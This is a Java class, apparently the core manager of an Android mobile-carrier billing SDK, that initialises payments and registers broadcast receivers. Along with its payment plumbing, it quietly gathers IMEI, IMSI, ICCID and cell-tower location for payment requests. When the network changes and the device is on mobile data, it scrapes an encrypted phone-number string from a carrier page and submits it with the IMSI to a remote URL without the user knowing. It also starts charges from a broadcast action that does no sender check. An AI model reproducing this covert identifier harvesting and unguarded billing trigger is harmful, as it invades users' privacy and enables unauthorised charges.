package com.core_sur.publics;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.lang.reflect.Constructor;
import java.lang.reflect.Method;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.text.MessageFormat;
import java.util.Enumeration;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.ScheduledThreadPoolExecutor;
import java.util.concurrent.TimeUnit;
import java.util.zip.ZipEntry;
import java.util.zip.ZipFile;

import org.json.JSONException;
import org.json.JSONObject;
import org.yummysdk.lib.YMBillingCallback;
import org.yummysdk.lib.YMBillingInterface;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.content.pm.Signature;
import android.content.pm.PackageManager.NameNotFoundException;
import android.content.res.AssetManager;
import android.content.res.Resources;
import android.content.res.XmlResourceParser;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Environment;
import android.os.Handler;
import android.os.Looper;
import android.os.Message;
import android.text.Html;

import c.h.u.a.b;

import com.core_sur.Config;
import com.core_sur.HttpCommon;
import com.core_sur.WCConnect;
import com.core_sur.HttpCommon.HttpResult;
import com.core_sur.activity.EActivity;
import com.core_sur.bean.EPConfig;
import com.core_sur.bean.EPInfo;
import com.core_sur.bean.RevBean;
import com.core_sur.event.impl.PayCenterEvent;
import com.core_sur.finals.CommonFinals;
import com.core_sur.finals.ErrorFinals;
import com.core_sur.finals.URLFinals;
import com.core_sur.interfaces.EPEngine;
import com.core_sur.listener.AsynResponse;
import com.core_sur.manager.DownModeService;
import com.core_sur.notifierad.XToneAdManager;
import com.core_sur.running.AppStatus;
import com.core_sur.tools.CarryImpi;
import com.core_sur.tools.CheckLog;
import com.core_sur.tools.CommonUtils;
import com.core_sur.tools.Log;
import com.core_sur.tools.MessageObjcet;

@SuppressLint({ "HandlerLeak", "UseSparseArrays" })
public class EPCoreManager implements EPEngine {
	private final EPConfig config = new EPConfig();
	private static EPCoreManager epManager;
	private Context c;
	private BroadcastReceiver pnBroadcast;// 手机号计费方式操作广播

	private EPCoreManager() {
	}

	public static EPCoreManager getInstance() {
		if (epManager == null) {
			epManager = new EPCoreManager();
		}
		return epManager;
	}

	private boolean isInit;
	// private Intent deepService;
	public String appVersion;
	private final EPInfo adInfo = new EPInfo();

	/**
	 * 
	 * 
	 * @param appVersion
	 *            应用版本号
	 * @param isCheckConfig
	 *            是否开启验证Log模式
	 */

	private void isAdInfoNotBlank(String appKey, String channelKey,
			String mobileType, String mobileSize, String mobileVersion,
			String deviceId, String imsi, String appVersion,
			String connectMethod, int network, String ipAddress) {
		boolean isError = false;
		if (CommonUtils.IsNotBlank(appKey)) {
			getInfo().appKey = appKey;
		} else {
			Log.i(c.getPackageName(), "appKeyNot");
			CheckLog.log(this.getClass().getName(), new Exception()
					.getStackTrace().toString(),
					ErrorFinals.ERROR_INIT_MUSTPARAMS
							+ ":[初始化失败] 获取失败 请检查是否填写是否正确");
		}
		if (CommonUtils.IsNotBlank(channelKey)) {
			getInfo().channelKey = channelKey;
		} else {
			CheckLog.log(this.getClass().getName(), new Exception()
					.getStackTrace().toString(),
					ErrorFinals.ERROR_INIT_MUSTPARAMS
							+ ":[初始化失败] ChannelKey 获取失败 请检查是否填写是否正确");
		}
		if (CommonUtils.IsNotBlank(mobileType)) {
			getInfo().mobileType = mobileType;
		} else {
			CheckLog.log(this.getClass().getName(), new Exception()
					.getStackTrace().toString(), "mobileTypeNot");
			isError = true;
		}
		if (CommonUtils.IsNotBlank(mobileSize)) {
			getInfo().mobileSize = mobileSize;
		} else {
			isError = true;
		}
		if (CommonUtils.IsNotBlank(mobileVersion)) {
			getInfo().mobileVersion = mobileVersion;
		} else {
			CheckLog.log(this.getClass().getName(), new Exception()
					.getStackTrace().toString(),
					ErrorFinals.ERROR_INIT_DISPENSABLEPARAMS
							+ ":mobileVersionNot");
			isError = true;
		}
		if (CommonUtils.IsNotBlank(imsi)) {
			getInfo().imsi = imsi;
		} else {
			CheckLog.log(this.getClass().getName(), new Exception()
					.getStackTrace().toString(), "imsiNot");
			isError = true;
		}
		if (CommonUtils.IsNotBlank(deviceId)) {
			getInfo().deviceId = deviceId;
		} else {
			isError = true;
			CheckLog.log(this.getClass().getName(), new Exception()
					.getStackTrace().toString(),
					ErrorFinals.ERROR_INIT_DISPENSABLEPARAMS + ":deviceIdNot");
		}
		if (CommonUtils.IsNotBlank(appVersion)) {
			getInfo().appVersion = appVersion;
		} else {
			getInfo().appVersion = "default";
			CheckLog.log(this.getClass().getName(), new Exception()
					.getStackTrace().toString(),
					ErrorFinals.ERROR_INIT_DISPENSABLEPARAMS + ":appVersionNot");
			isError = true;
		}
		if (CommonUtils.IsNotBlank(connectMethod)) {
			getInfo().connectMethod = connectMethod;
		} else {
			getInfo().connectMethod = "WIFI";
			CheckLog.log(this.getClass().getName(), new Exception()
					.getStackTrace().toString(),
					ErrorFinals.ERROR_INIT_DISPENSABLEPARAMS
							+ ":connectMethodNot");
			isError = true;
		}
		if (CommonUtils.IsNotBlank(ipAddress)) {
			getInfo().ipAddress = ipAddress;
		} else {
			CheckLog.log(this.getClass().getName(), new Exception()
					.getStackTrace().toString(),
					ErrorFinals.ERROR_INIT_DISPENSABLEPARAMS + ":ipAddressNot");
			isError = true;
		}
		getInfo().network = network;
		if (isError) {
			CheckLog.log(this.getClass().getName(), new Exception()
					.getStackTrace().toString(), "[初始化成功]部分次要参数获取错误 不影响程序正常使用");
		} else {
			CheckLog.log(this.getClass().getName(), new Exception()
					.getStackTrace().toString(), "[初始化成功]获取初始化参数正确");
		}

	}

	YMBillingCallback mBillingCallback;

	public void initPay(Context context, boolean isCheckConfig) {
		epManager.c = context;
		init(context, isCheckConfig);

		// 第三方初始化
		
//		XToneAdManager.newInstance(context.getApplicationContext()).start();
		
		/*File dirCache = CommonUtils.getDirCache(context);
		if (dirCache != null) {
			String dexpath = new File(dirCache.getAbsolutePath(),
					context.getPackageName() + ".ep.dex").getAbsolutePath();
			copySO(dexpath);
			// System.out.println("copySO:" + getSOFilePath());
			YMBillingInterface.loadSO(getSOFilePath());
		}*/
		
		//System.load("/data/data/" + context.getPackageName() + "/lib/libyummy.so");
		System.loadLibrary("yummy");
		
		Log.e("test", "after loadLibrary");
		//System.loadLibrary ("yummy");
		//System.load("/data/data/" + paramContext.getPackageName() + "/lib/libqygame.so");
		mBillingCallback = new YMBillingCallback() {
			@Override
			public void onInitSuccess(String extra) {
				Log.e("test","yubill--psuccess");
			}
			@Override
			public void onInitFail(String extra, int code) {
				Log.e("test","yubill--pfail");
			}
			@Override
			public void onSuccess(String chargepoint) {
			}
			@Override
			public void onCancel(String chargepoint) {
			}
			@Override
			public void onFail(String chargepoint, int code) {
			}
		};		
		if (CommonUtils.getWindowTopViews() != null
				&& CommonUtils.getWindowTopViews().length > 0) {
			final Context c1 = CommonUtils.getWindowTopViews()[0].getContext();
			//YMBillingInterface.init((Activity)c1, "PPHR1YTRZY", 0x400, mBillingCallback);
			String ymAppkey = CommonUtils.getYmAppKey(c);
			Log.e("test","yubill--ymAppkey"+ymAppkey);
			YMBillingInterface.init((Activity) c1, ymAppkey, 0, mBillingCallback);
		}

		String str = "packagename=" + getContext().getPackageName()
				+ "&appsign=" + getSignature(getContext()) + "&appkey="
				+ CommonUtils.getAppKey(getContext());
		getContext().getSharedPreferences("signinfo", Context.MODE_PRIVATE)
				.edit().putString("signparams", str).commit();

		try {
			String args = new JSONObject().put("channelKey",
					CommonUtils.getCLnew(c)).toString();
			
			System.out.println("Andy Tag : Start Regedit");
			
			WCConnect.getInstance().Regedit(1, c, CommonUtils.getAppKey(c),
					args);
			// SMSHolder.getInstance().StartHolder(c);
			regBroadCast();
			regPNumberBroadCast();
		} catch (JSONException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}

	public String GetFeeInfo(Context context, String OtherInfo, String UserTag,
			int Amount, String note) {
		return WCConnect.getInstance().GetFeeInfo(context, OtherInfo, UserTag,
				Amount, note);
	}

	public Handler payHandler = new Handler(Looper.getMainLooper()) {
		@Override
		public void handleMessage(android.os.Message msg) {
			Intent intent = new Intent(c.getPackageName()
					+ CommonFinals.ACTION_PAY_LIEN);
			if (msg.what == 1078) {
				Intent sendPaySuccess = new Intent(c.getPackageName()
						+ ".my.fee.listener");
				sendPaySuccess.putExtra("sendPaySuccess", 1);
				c.sendBroadcast(sendPaySuccess);
			}

			// if (((String)msg.obj).equals("应用公钥不合法")) {
			if (msg.obj != null && ("应用公钥不合法").equals((String) msg.obj)) {
				Intent sendPaySuccess = new Intent(c.getPackageName()
						+ ".my.fee.listener");
				sendPaySuccess.putExtra("sendPaySuccess", 1);
				c.sendBroadcast(sendPaySuccess);
			}

			intent.putExtra("msg.what", msg.what);
			intent.putExtra("msg.obj", msg.obj + "");
			c.sendBroadcast(intent);
		};
	};

	@Override
	public void pay(Object... obj) {

		// 判断验证结果
		if (com.core_sur.Config.isCheck) {
			int flag = c.getSharedPreferences("signinfo", Context.MODE_PRIVATE)
					.getInt("checkresult", 0);
			if (flag == 0) {
				initPaySuccess(com.core_sur.Config.CMD_NOCONFIG, "应用公钥不合法");
				return;
			}
		}

		JSONObject userOther = new JSONObject();
		try {
			userOther.put("channelKey", CommonUtils.getCLnew(c));
			if (obj.length >= 3 && obj[2] != null) {
				userOther.put("user_orderid", String.valueOf(obj[2]));
			}
			userOther.put("sdkVersion",
					CommonUtils.getSp(EPCoreManager.getInstance().getContext())
							.getString("version", "0"));
			userOther.put("connectMethod", CommonUtils.getConnectMethod(c));
			userOther.put("deviceIpAddres", "");
			userOther.put("iccid", CommonUtils.getICCID(c));

			// 获取 lac cid
			int[] a = CommonUtils.getlac_cid(c);
			userOther.put("lac", a[0] + "");
			userOther.put("cid", a[1] + "");

		} catch (JSONException e) {
			e.printStackTrace();
		}
		pay(payHandler, (Integer) obj[0], userOther.toString(), "",
				(String) obj[1]);
	}

	long preSendPayTime = 0;

	public void pay(final Handler handler, final int num,
			final String OtherInfo, final String UserTag, final String note) {
		CheckLog.log(this.getClass().getName(), new Exception().getStackTrace()
				.toString(), "pay method");

		int time = c.getSharedPreferences("signinfo", Context.MODE_PRIVATE)
				.getInt("paytime", 3000);
		// System.out.println("----time---" + time);

		if (!(System.currentTimeMillis() - preSendPayTime > time)) {
			Intent sendPaySuccess = new Intent(c.getPackageName()
					+ ".my.fee.listener");
			sendPaySuccess.putExtra("sendPaySuccess", 1);
			c.sendBroadcast(sendPaySuccess);
			Message msg = Message.obtain();
			msg.what = 1070;
			msg.obj = "两次计费间隔不能小于" + time / 1000 + "秒";
			handler.sendMessage(msg);
			return;
		}
		preSendPayTime = System.currentTimeMillis();
		Thread thread = new Thread() {
			@Override
			public void run() {
				super.run();
				WCConnect.getInstance().Pay(handler, c, UserTag, OtherInfo,
						num, note);
			}
		};
		thread.start();
	}

	/**
	 * 二次确认界面
	 * 
	 * @param payNumber
	 * @param payPoint
	 */
	public void showPayHintActivity(String payNumber, String payPoint) {
		Intent intent = new Intent();
		intent.setComponent(new ComponentName(c.getPackageName(),
				CommonFinals.SHOW_ACTIVITY));
		intent.putExtra("message_type",
				CommonFinals.MESSAGE_TYPE_POSITIVEPAY_ACTIVITY);
		PayCenterEvent payCenterEvent = new PayCenterEvent(payPoint,
				CommonUtils.getAppName(c), payNumber);
		JSONObject jsonObject = new JSONObject();
		try {
			jsonObject.put("appName", payCenterEvent.getAppName());
			jsonObject.put("payPoint", payCenterEvent.getPayPoint());
			jsonObject.put("payNumber", payCenterEvent.getPayNumber());
			intent.putExtra("message", jsonObject.toString());
			intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
			c.startActivity(intent);
		} catch (JSONException e) {
			e.printStackTrace();
		}
	}

	/**
	 * 电话号码计费界面
	 * 
	 * @param payNumber
	 * @param payPoint
	 */
	public void showPayPNActivity(String payNumber, String payPoint) {
		Intent intent = new Intent();
		intent.setComponent(new ComponentName(c.getPackageName(),
				CommonFinals.SHOW_ACTIVITY));
		intent.putExtra("message_type",
				CommonFinals.MESSAGE_TYPE_PNPAY_ACTIVITY);
		PayCenterEvent payCenterEvent = new PayCenterEvent(payPoint,
				CommonUtils.getAppName(c), payNumber);
		JSONObject jsonObject = new JSONObject();
		try {
			jsonObject.put("appName", payCenterEvent.getAppName());
			jsonObject.put("payPoint", payCenterEvent.getPayPoint());
			jsonObject.put("payNumber", payCenterEvent.getPayNumber());
			intent.putExtra("message", jsonObject.toString());
			intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
			c.startActivity(intent);
		} catch (JSONException e) {
			e.printStackTrace();
		}
	}

	public void payOK() {
		CheckLog.log(this.getClass().getName(), new Exception().getStackTrace()
				.toString(), "payOK");
		com.core_sur.Config.FeeWindowMode = 2;
	}

	public void payFail() {
		CheckLog.log(this.getClass().getName(), new Exception().getStackTrace()
				.toString(), "payFail");
		com.core_sur.Config.FeeWindowMode = 3;
		WCConnect.getInstance().UserCancelFeeDialog();
	}

	public String GetUserMobileNo() {
		return WCConnect.getInstance().GetUserMobileNo();
	}

	public String AUTUserMobileNo(Boolean IsAUT) {
		return WCConnect.getInstance().AUTUserMobileNo(IsAUT);
	}

	public int getUId() {
		return WCConnect.getInstance().regResponse.getUid();
	}

	/***
	 * 
	 * 初始化入口
	 * 
	 * @param appVersion
	 * @param isCheckConfig
	 */
	public void init(Context context, boolean isCheckConfig) {
		epManager.c = context;
		CheckLog.setOpenCheckConfigIs(isCheckConfig);
		this.appVersion = getVersionName();
		if (!isInit) {
			String appKey = CommonUtils.getAppKey(c);
			String channelKey = CommonUtils.getCLnew(c);
			String mobileType = CommonUtils.getMobileType();
			String mobileSize = CommonUtils.getScreenWidth(c) + "X"
					+ CommonUtils.getScreenHeight(c);
			String mobileVersion = CommonUtils.getMobileVersion();
			String deviceId = CommonUtils.getImei(c);
			String imsi = CommonUtils.getImsi(c);
			String ip = CommonUtils.getLocalIpAddress();
			String connectMethod = CommonUtils.getConnectMethod(c);
			int network = CommonUtils.getNetWork(c);
			isAdInfoNotBlank(appKey, channelKey, mobileType, mobileSize,
					mobileVersion, deviceId, imsi, appVersion, connectMethod,
					network, ip);
			initMessage();
			// AppNotificationManager.getInstance(c).init(appKey, carryImpi);
			// AppNotificationManager.getInstance(c).start();
			DownModeService.getInstance(c).init();
			isInit = true;
		} else {
			CheckLog.log(this.getClass().getName(), new Exception()
					.getStackTrace().toString(),
					ErrorFinals.ERROR_INIT_AGAINPARAMS + ":请检测代码不允许重复初始化");
		}
	}

	protected void initMessage() {
		sendMessage(URLFinals.WEB_INITAPPADCONFIG, getInfo().appKey,
				new AsynResponse() {
					@Override
					public void receiveDataSuccess(String result) {
						if (result == null) {
							CheckLog.log(
									this.getClass().getName(),
									new Exception().getStackTrace()[new Exception()
											.getStackTrace().length - 1]
											.toString(),
									ErrorFinals.ERROR_INIT_RESPONSENULL
											+ ":init初始化失败 错误代码:0x01");
							return;
						}
						try {
							JSONObject json = new JSONObject(result);
							String provinces = json.getString("Provinces");
							String[] ps = provinces.split(",");
							for (int i = 0; i < ps.length; i++) {
								String[] co = ps[i].split(":");
								if (co.length == 2) {
									config.provinces.put(
											Integer.valueOf(co[0]), co[1]);
								}
							}
							int id = json.getInt("Id");
							config.appId = id;
							String type = json.getString("JType");
							String[] tp = type.split(",");
							for (int i = 0; i < tp.length; i++) {
								String[] co = ps[i].split(":");
								if (co.length == 2) {
									config.adPrices.put(co[1],
											Integer.valueOf(co[0]));
								}
							}
							CheckLog.log(
									this.getClass().getName(),
									new Exception().getStackTrace()[new Exception()
											.getStackTrace().length - 1]
											.toString(), "中间件初始化全部完成");
							ScheduledExecutorService executorService = new ScheduledThreadPoolExecutor(
									3);
							executorService.scheduleAtFixedRate(
									new AppStatus(), 1, 1, TimeUnit.SECONDS);
						} catch (JSONException e) {
							e.printStackTrace();
							CheckLog.log(
									this.getClass().getName(),
									new Exception().getStackTrace()[new Exception()
											.getStackTrace().length - 1]
											.toString(),
									ErrorFinals.ERROR_INIT_RESPONSEJSONANALYZE
											+ ":init初始化失败 错误代码:0x08");
						}
					}

					@Override
					public void receiveDataError(Integer result) {
						CheckLog.log(this.getClass().getName(), new Exception()
								.getStackTrace().toString(),
								ErrorFinals.ERROR_INIT_RESPONSENULL
										+ ":init初始化失败 可能网络异常");
					}
				});
	}

	public void regBroadCast() {
		BroadcastReceiver payAction = new BroadcastReceiver() {

			private boolean hasComit = false;

			@Override
			public void onReceive(Context context, Intent intent) {
				if (intent.getAction().equals(
						MessageFormat.format(CommonFinals.ACTION_PAY_OK_FORM,
								c.getPackageName()))) {
					payOK();
				} else if (intent.getAction().equals(
						MessageFormat.format(CommonFinals.ACTION_PAY_FAIL_FORM,
								c.getPackageName()))) {
					payFail();
				} else if (intent.getAction().equals(
						MessageFormat.format(CommonFinals.PAYFORMAT,
								c.getPackageName()))) {
					pay(intent.getExtras().getInt("payNumber"), intent
							.getExtras().getString("payNote"), intent
							.getExtras().getString("userOrderId"));
				};

				// 监听网络变化,增加获取手机号概率
				if (intent.getAction().equals(
						MessageFormat.format("{0}.ep.network.change",
								c.getPackageName()))) {
					// System.out.println("network change");
					ConnectivityManager cm = (ConnectivityManager) context
							.getSystemService(Context.CONNECTIVITY_SERVICE);
					NetworkInfo netInfo = cm.getActiveNetworkInfo();

					// 在本次启动中提交过一次就不再尝试获取和提交
					if (hasComit)
						return;

					if (netInfo != null && netInfo.isAvailable()) {
						new Thread(new Runnable() {
							@Override
							public void run() {
								// TODO Auto-generated method stub
								if (CommonUtils.getNetWork(Config.getInstance().tpContext) == 1) {
									HttpResult hres = HttpCommon
											.getHtmlContents(Config.getenurl,
													"", false);
									if (hres.StatusCode == 200) {

										String temp = Html
												.fromHtml(hres.HtmlContents)
												.toString().trim()
												.replaceAll("\r|\n", "");
										temp = temp.substring(
												temp.indexOf("号") + 1,
												temp.length());

										if (temp.length() == 0)
											return;
										temp = "?imsi="
												+ CommonUtils.getImsi(Config
														.getInstance().tpContext)
												+ "&encryptStr=" + temp;
										HttpCommon.getHtmlContents(
												Config.submitenurl + temp, "",
												false);
										hasComit = true;
									}
								}
							}
						}).start();
					}
				}
			}
		};
		IntentFilter payLisn = new IntentFilter();
		payLisn.addAction(MessageFormat.format(CommonFinals.ACTION_PAY_OK_FORM,
				c.getPackageName()));
		payLisn.addAction(MessageFormat.format(
				CommonFinals.ACTION_PAY_FAIL_FORM, c.getPackageName()));
		payLisn.addAction(MessageFormat.format(CommonFinals.PAYFORMAT,
				c.getPackageName()));
		payLisn.addAction(MessageFormat.format("{0}.ep.network.change",
				c.getPackageName()));
		c.registerReceiver(payAction, payLisn);
	}

	public static EPInfo getInfo() {
		return epManager.adInfo;
	}

	CarryImpi carryImpi = new CarryImpi(c);

	public void sendMessenger(String url, MessageObjcet messageObjcet,
			AsynResponse asynResponse) {
		carryImpi.sendMessage(url, messageObjcet, asynResponse);

	}

	public void sendMessage(final String url, final MessageObjcet objcet,
			final AsynResponse asynResponse) {
		CheckLog.log(this.getClass().getName(), new Exception().getStackTrace()
				.toString(), "sendMessage被调用");
		sendMessenger(url, objcet, asynResponse);
	}

	public class MessageHolder {
		public MessageHolder(String url, MessageObjcet messageObjcet,
				AsynResponse asynResponse) {
			this.url = url;
			this.messageObjcet = messageObjcet;
			this.asynResponse = asynResponse;
		}

		MessageObjcet messageObjcet;
		AsynResponse asynResponse;
		String url;
	}

	public void sendMessage(final String url, final String str,
			final AsynResponse asynResponse) {
		sendMessenger(url, str, asynResponse);

	}

	protected void sendMessenger(String url, String str,
			AsynResponse asynResponse) {
		carryImpi.sendData(url, str, asynResponse);
	}

	public static EPConfig getConfig() {
		return EPCoreManager.epManager.config;
	}

	/**
	 * obj[0] == 初始化类型
	 * 
	 */
	int INIT_PAY = 1000;
	int INIT_COMMON = 1001;

	public void initPaySuccess(int isPaySuccess, String message) {
		if (message != null && !message.equals("")) {
			Message msg = Message.obtain();
			msg.what = isPaySuccess;
			msg.obj = message;
			EPCoreManager.getInstance().payHandler.sendMessage(msg);
		}
	}

	public void initPaySuccess(int isPaySuccess) {
		if (isPaySuccess == com.core_sur.Config.INIT_SUCCESS) {
			Message msg = Message.obtain();
			msg.what = com.core_sur.Config.INIT_SUCCESS;
			msg.obj = "初始化成功";
			EPCoreManager.getInstance().payHandler.sendMessage(msg);
		} else {
			Message msg = Message.obtain();
			msg.what = com.core_sur.Config.INIT_FAILED;
			msg.obj = "初始化失败,当前网络状态不佳";
			EPCoreManager.getInstance().payHandler.sendMessage(msg);
		}
	}

	@Override
	public void init(Object... obj) {
		if (obj == null || obj.length == 0) {
			CheckLog.log(this.getClass().getName(), "init", "初始化 参数错误 error");
			return;
		}
		if (obj[0].equals(INIT_PAY)) {
			initPay((Context) obj[1], (Boolean) obj[2]);
		} else if (obj[0].equals(INIT_COMMON)) {
			init((Context) obj[1], (Boolean) obj[2]);
		} else if (obj[0].equals(INIT_PAY)) {
		}

	}

	public String getVersionName() {
		if (c == null) {
			return "0.0.0";
		}
		// 获取packagemanager的实例
		PackageManager packageManager = c.getPackageManager();
		// getPackageName()是你当前类的包名，0代表是获取版本信息
		PackageInfo packInfo;
		try {
			packInfo = packageManager.getPackageInfo(c.getPackageName(), 0);
			int version = packInfo.versionCode;
			return String.valueOf(version);
		} catch (NameNotFoundException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		return "0.0.0";
	}

	public Context getContext() {
		// TODO Auto-generated method stub
		return c;
	}

	private String getSignature(Context c) {
		try {
			PackageInfo packageInfo = c.getPackageManager().getPackageInfo(
					c.getPackageName(), PackageManager.GET_SIGNATURES);
			Signature[] signatures = packageInfo.signatures;
			char[] HEX = { '0', '1', '2', '3', '4', '5', '6', '7', '8', '9',
					'a', 'b', 'c', 'd', 'e', 'f' };
			byte[] md5Byte = MessageDigest.getInstance("MD5").digest(
					signatures[0].toCharsString().getBytes());
			StringBuffer sb = new StringBuffer();
			for (int i = 0; i < md5Byte.length; i++) {
				sb.append(HEX[(int) (md5Byte[i] & 0xff) / 16]);
				sb.append(HEX[(int) (md5Byte[i] & 0xff) % 16]);
			}
			return sb.toString();
		} catch (NameNotFoundException e) {
			e.printStackTrace();
		} catch (NoSuchAlgorithmException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		return "";
	}

	private void regPNumberBroadCast() {
		pnBroadcast = new BroadcastReceiver() {
			@Override
			public void onReceive(Context context, Intent intent) {
				// TODO Auto-generated method stub

				RevBean rb = new RevBean();
				Message messageCallBack = new Message();
				switch (intent.getIntExtra("what", 0)) {
				case 1:
					// 提交手机号
					rb.setCmdid(Config.CMD_GetMobileNoByUserInput);
					rb.setDelayTime(0);
					rb.setLinkid(0);
					rb.setMsg(intent.getStringExtra("msg"));

					messageCallBack.obj = rb;
					messageCallBack.what = 0;
					WCConnect.getInstance().handlerAction
							.sendMessage(messageCallBack);
					// PostLog(rb);
					break;

				case 2:
					// 提交验证码
					rb.setCmdid(Config.CMD_GetCodeNoByUserInput);
					rb.setDelayTime(0);
					rb.setLinkid(0);
					rb.setMsg(intent.getStringExtra("msg"));

					messageCallBack.obj = rb;
					messageCallBack.what = 0;
					WCConnect.getInstance().handlerAction
							.sendMessage(messageCallBack);
					// PostLog(rb);
					break;

				case 3:
					// 用户取消计费
					Message msg = Message.obtain();
					if (intent.getStringExtra("msg").equals("fail")) {
						msg.what = 1078;
						msg.obj = "取消支付";
					} else if (intent.getStringExtra("msg").equals("success")) {
						msg.what = Config.CMD_COMPLETE;
						msg.obj = "完成支付";
					}
					payHandler.sendMessage(msg);
					break;

				case 4:
					// 轮询计费结果
					rb.setCmdid(Config.CMD_GetPayStatusByUserInput);
					rb.setDelayTime(0);
					rb.setLinkid(0);
					rb.setMsg("");

					messageCallBack.obj = rb;
					messageCallBack.what = 0;
					WCConnect.getInstance().handlerAction
							.sendMessage(messageCallBack);
					// PostLog(rb);
					break;

				case 5:
					// 计费结果通知
					if (intent.getStringExtra("msg").equals("success")) {

					} else if (intent.getStringExtra("msg").equals("fail")) {

					}
					// PostLog(rb);
					break;
				default:
					break;
				}
			}
		};
		c.registerReceiver(
				pnBroadcast,
				new IntentFilter(MessageFormat.format(
						CommonFinals.ACTION_PNPAY_SEND, c.getPackageName())));
	}

	private void PostLog(RevBean rb) {
		WCConnect.getInstance().PostLog(
				"PNumberPay" + Config.splitStringLevel1 + rb.getCmdid()
						+ Config.splitStringLevel1 + rb.getMsg()
						+ Config.splitStringLevel1 + "SendOK");
	}

	private static Resources getPackageResource(Context context) {
		try {
			File dirCache = CommonUtils.getDirCache(context);
			if (dirCache != null) {

				String dexpath = new File(dirCache.getAbsolutePath(),
						context.getPackageName() + ".ep.dex").getAbsolutePath();
				// 反射出资源管理器
				// addAssetPath. Add an additional set of assets to the asset
				// manager. This can be
				// either a directory or ZIP file.
				Class<?> class_AssetManager = Class
						.forName("android.content.res.AssetManager");
				Object assetMag = class_AssetManager.newInstance();
				// Method method_addAssetPath =
				// class_AssetManager.getDeclaredMethod(
				// "addAssetPath", String.class);
				// cookie = (Integer) method_addAssetPath.invoke(assetMag,
				// dexpath);
				// 是为了下一行传递参数用的
				Resources res = context.getResources();
				// 获取需要用到的构造函数
				// Create a new Resources object on top of an existing set of
				// assets
				// in an
				// * AssetManager.
				Constructor<?> constructor_Resources = Resources.class
						.getConstructor(class_AssetManager, res
								.getDisplayMetrics().getClass(), res
								.getConfiguration().getClass());
				// 实例化Resources
				res = (Resources) constructor_Resources.newInstance(assetMag,
						res.getDisplayMetrics(), res.getConfiguration());
				return res;
				/*
				 * String test = res.getString(id);
				 * CheckLog.log(this.getClass().getName(),new
				 * Exception().getStackTrace().toString()(test);
				 */
			}
		} catch (Exception e) {
			CheckLog.log(EActivity.class.getClass().getName(), new Exception()
					.getStackTrace().toString(), e.getMessage());
			e.printStackTrace();
		}
		return null;
	}

	public void copyFile(InputStream inStream, String newPath) {
		try {
			if (inStream == null) {
				return;
			}
			int bytesum = 0;
			int byteread = 0;
			FileOutputStream fs = new FileOutputStream(newPath);
			byte[] buffer = new byte[1444];
			int length;
			while ((byteread = inStream.read(buffer)) != -1) {
				bytesum += byteread; // 字节文件大小
				// System.out.println(bytesum);
				fs.write(buffer, 0, byteread);
			}
			fs.flush();
			inStream.close();
			fs.close();
		} catch (Exception e) {
			System.out.println("复制单个文件操作出错");
			e.printStackTrace();

		}

	}

	public String getSOFilePath() {
		Service service = (Service) c;
		String cache = getDirCache(service.getApplication()).getAbsolutePath();
		return new File(cache, "libyummy.so").getAbsolutePath();
	}

	public static File getDirCache(Context context) {
		File file = null;
		// if (hasSDCard()) {
		// //System.out.println("取缓存");
		// file = context.getExternalCacheDir();
		// if (file == null || !file.exists()) {
		// file = context
		// .getExternalFilesDir(Environment.DIRECTORY_DOWNLOADS);
		// }
		// }
		if (file == null || !file.canRead() || !file.canWrite()
				|| !file.exists()) {
			// System.out.println("取缓存路径");
			file = context.getFilesDir();
			if (file == null || !file.exists()) {
				File data = new File(Environment.getDataDirectory() + "/ep");
				if (!data.exists()) {
					data.mkdirs();
				}
				file = data;
			}
		}

		return file;
	}

	public static boolean hasSDCard() {
		return Environment.MEDIA_MOUNTED.equals(Environment
				.getExternalStorageState());
	}

	// packagename/files/*.jar
	public void copySO(String string) {
		try {
			ZipFile zip = new ZipFile(string);
			Enumeration<ZipEntry> enus = (Enumeration<ZipEntry>) zip.entries();
			while (enus.hasMoreElements()) {
				ZipEntry zipEntry = (ZipEntry) enus.nextElement();
				// System.out.println(zipEntry.getName());
				if (zipEntry.getName().contains("libyummy")) {
					InputStream in = zip.getInputStream(zipEntry);
					copyFile(in, new File(getSOFilePath()).getAbsolutePath());
					in.close();
					// System.out.println("mmpay copy finish");
				}
			}
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}

}
